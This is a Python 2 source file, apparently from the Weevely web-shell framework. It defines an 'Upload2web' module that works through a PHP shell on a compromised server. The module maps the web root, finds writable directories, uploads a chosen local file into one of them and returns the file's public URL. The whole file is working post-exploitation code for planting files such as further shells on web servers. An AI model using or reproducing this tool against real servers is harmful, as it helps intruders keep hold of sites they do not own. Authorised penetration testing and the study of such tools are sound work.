'''
Created on 23/set/2011

@author: norby
'''
from core.module import Module
from modules.file.upload import Upload
from core.moduleexception import  ModuleException, ExecutionException, ProbeException, ProbeSucceed
from core.http.cmdrequest import CmdRequest, NoDataException
from core.argparse import ArgumentParser
from core.argparse import SUPPRESS
import os
from random import choice
from string import ascii_lowercase
from urlparse import urlsplit, urlunsplit


WARN_WEBROOT_INFO = 'Error getting web environment information'
WARN_NOT_WEBROOT_SUBFOLDER = "is not a webroot subdirectory"
WARN_NOT_FOUND = 'Path not found'
WARN_WRITABLE_DIR_NOT_FOUND = "Writable web directory not found"

class WebEnv:
    
    def __init__(self, support_vectors, url):
        
        self.support_vectors = support_vectors
        self.name = 'webenv'
        
        script_folder = self.support_vectors.get('script_folder').execute()
        script_url_splitted = urlsplit(url)
        script_url_path_folder, script_url_path_filename = os.path.split(script_url_splitted.path)
        
        url_folder_pieces = script_url_path_folder.split(os.sep)
        folder_pieces = script_folder.split(os.sep)

        for pieceurl, piecefolder in zip(reversed(url_folder_pieces), reversed(folder_pieces)):
            if pieceurl == piecefolder:
                folder_pieces.pop()
                url_folder_pieces.pop()
            else:
                break
            
        base_url_path_folder = os.sep.join(url_folder_pieces)
        self.base_folder_url = urlunsplit(script_url_splitted[:2] + ( base_url_path_folder, ) + script_url_splitted[3:])
        self.base_folder_path = os.sep.join(folder_pieces)
        
        if not self.base_folder_url or not self.base_folder_path:
            raise ProbeException(self.name, WARN_WEBROOT_INFO)
        
    def folder_map(self, relative_path_folder = '.'):
        
        absolute_path =  self.support_vectors.get('normalize').execute({ 'path' : relative_path_folder })
        
        if not absolute_path:
            raise ProbeException(self.name, '\'%s\' %s' % (relative_path_folder, WARN_NOT_FOUND))
        
        if not absolute_path.startswith(self.base_folder_path.rstrip('/')):
            raise ProbeException(self.name, '\'%s\' not in \'%s\': %s' % (absolute_path, self.base_folder_path.rstrip('/'), WARN_NOT_WEBROOT_SUBFOLDER) ) 
            
        relative_to_webroot_path = absolute_path.replace(self.base_folder_path,'')
        
        url_folder = '%s/%s' % ( self.base_folder_url.rstrip('/'), relative_to_webroot_path.lstrip('/') )
        
        return absolute_path, url_folder
    
    def file_map(self, relative_path_file):
        
        relative_path_folder, filename = os.path.split(relative_path_file)
        if not relative_path_folder: relative_path_folder = './'
        
        
        absolute_path_folder, url_folder = self.folder_map(relative_path_folder)
    
        absolute_path_file = os.path.join(absolute_path_folder, filename)
        url_file = os.path.join(url_folder, filename)
        
        return absolute_path_file, url_file
    

class Upload2web(Upload):
    '''Upload binary/ascii file into remote web folders and guess corresponding url'''


    def _set_args(self):
        
        self.argparser.add_argument('lpath')
        self.argparser.add_argument('rpath', help='Optional, upload as rpath', nargs='?')
        
        self.argparser.add_argument('-startpath', help='Upload in first writable subdirectory', metavar='STARTPATH', default='.')
        self.argparser.add_argument('-chunksize', type=int, default=1024)
        self.argparser.add_argument('-content', help=SUPPRESS)
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        self.argparser.add_argument('-force', action='store_true')


    def _set_vectors(self):
        Upload._set_vectors(self)
        
        self.support_vectors.add_vector('find_writable_dirs', 'find.perms', '-type d -writable $path'.split(' '))
        self.support_vectors.add_vector('document_root', 'system.info', 'document_root' )
        self.support_vectors.add_vector('normalize', 'shell.php', 'print(realpath("$path"));')
        self.support_vectors.add_vector('script_folder', 'shell.php', 'print(dirname(__FILE__));')

    
    def _prepare(self):

        Upload._load_local_file(self)
        
        webenv = WebEnv(self.support_vectors, self.modhandler.url)
        
        if self.args['rpath']:
            # Check if remote file is actually in web root
            self.args['rpath'], self.args['url'] = webenv.file_map(self.args['rpath'])
        else:
            
            # Extract filename
            filename = self.args['lpath'].split('/')[-1]
            
            # Check if starting folder is actually in web root
            try:
                absolute_path_folder, url_folder = webenv.folder_map(self.args['startpath'])
            except ProbeException, e:
                # If default research fails, retry from web root base folder
                if self.args['startpath'] != '.':
                    raise
                else:
                    try:
                        absolute_path_folder, url_folder = webenv.folder_map(webenv.base_folder_path)
                    except ProbeException, e2:       
                        raise e
            
            # Start find in selected folder
            writable_subdirs = self.support_vectors.get('find_writable_dirs').execute({'path' : absolute_path_folder})

            if not writable_subdirs:
                raise ProbeException(self.name, WARN_WRITABLE_DIR_NOT_FOUND)
                
            writable_folder, writable_folder_url = webenv.folder_map(writable_subdirs[0])
            
            self.args['rpath'] = os.path.join(writable_folder, filename)
            
            self.args['url'] = os.path.join(writable_folder_url, filename)        
                
        
                
        Upload._check_remote_file(self)                
        
    
    def _stringify_result(self):
        if self._result:
            self._result = [ self.args['rpath'], self.args['url'] ]
        else:
            self._result = [ '', '' ]
        
        return Upload._stringify_result(self)
    
